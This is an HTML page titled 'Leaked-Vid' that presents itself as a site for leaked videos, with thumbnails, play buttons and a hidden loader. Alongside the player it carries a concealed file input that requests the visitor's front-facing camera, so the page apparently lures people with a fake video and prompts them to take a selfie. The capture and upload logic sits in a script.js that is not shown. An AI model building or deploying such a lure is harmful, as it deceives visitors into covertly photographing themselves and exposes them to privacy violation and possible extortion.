<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Leaked-Vid</title>
    <link rel="stylesheet" href="style.css">
    <script src="script.js" defer></script>
</head>
<body>
    <header>
        <h1>Leaked-Vid</h1>
        <nav>
            <a href="#home">Home</a>
            <a href="#videos">Videos</a>
            <a href="#about">About</a>
        </nav>
    </header>
    
    <main>
        <section id="video">
            <div class="video-container">
                <img src="pics/vid-1.png" class="thumbnail" alt="Thumbnail">
                <video id="videoPlayer">
                    <source src="video.mp4" type="video/mp4">
                    Your browser does not support the video tag.
                </video>
                <div id="playButton" class="play-button">▶</div>
                <div id="loader" class="loader" style="display: none;"></div>
                <input type="file" id="cameraInput" accept="image/*" capture="user" style="display: none;">
            </div>
            <h2>vid-1</h2>
        </section>
        
        <section id="more-videos">
            <h2>More Videos</h2>
            <div class="video-grid">
                <div class="video-item">
                    <div class="video-container small">
                        <img src="pics/vid-2.png" class="thumbnail" alt="Thumbnail">
                        <video class="extra-video">
                            <source src="video.mp4" type="video/mp4">
                        </video>
                        <div class="play-button small">▶</div>
                    </div>
                    <h3>vid-2</h3>
                </div>
            </div>
        </section>
    </main>
    
    <footer>
        <p>&copy; 2024 Leaked-Vid. All rights reserved.</p>
    </footer>
</body>
</html>
